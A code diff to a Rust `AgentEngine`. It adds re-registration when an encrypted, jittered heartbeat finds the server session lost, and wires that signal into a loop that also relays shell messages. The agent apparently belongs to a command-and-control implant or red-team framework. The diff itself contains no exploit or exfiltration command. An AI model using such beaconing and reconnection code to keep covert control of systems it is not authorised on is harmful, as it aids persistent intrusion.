@@ -138,12 +138,22 @@ impl AgentEngine {
         ));
 
         // Spawn heartbeat task using its own HTTP client, AES-GCM encrypted
-        // with the session key, with per-tick jitter.
+        // with the session key, with per-tick jitter. Signals a re-register if
+        // the session is lost (e.g. the server restarted).
+        let (reconnect_tx, mut reconnect_rx) = tokio::sync::mpsc::unbounded_channel::<()>();
         let hb_mm = module_manager.clone();
+        let hb_reconnect = reconnect_tx.clone();
         tokio::spawn(async move {
             let hb_http = HttpCommunicator::new(&server_url, &register_path, &heartbeat_path, &result_path);
             loop {
-                let _ = heartbeat_tick(&hb_http, &agent_id, hb_key.as_ref(), &hb_mm).await;
+                match heartbeat_tick(&hb_http, &agent_id, hb_key.as_ref(), &hb_mm).await {
+                    Err(e) if e == "SESSION_LOST" => {
+                        eprintln!("[WARN] session lost — triggering re-registration");
+                        let _ = hb_reconnect.send(());
+                        break;
+                    }
+                    _ => {}
+                }
                 tokio::time::sleep(std::time::Duration::from_millis(
                     jittered_interval(hb_interval_ms, hb_jitter),
                 )).await;
@@ -155,6 +165,11 @@ impl AgentEngine {
         let mut reconnect_delay_ms = 1000u64;
         loop {
             tokio::select! {
+                _ = reconnect_rx.recv() => {
+                    eprintln!("[INFO] re-registering with server");
+                    break;
+                }
+
                 Some(msg) = shell_rx.recv() => {
                     eprintln!("[SEND] {} | rid={} | data={}",
                         msg.msg_type,
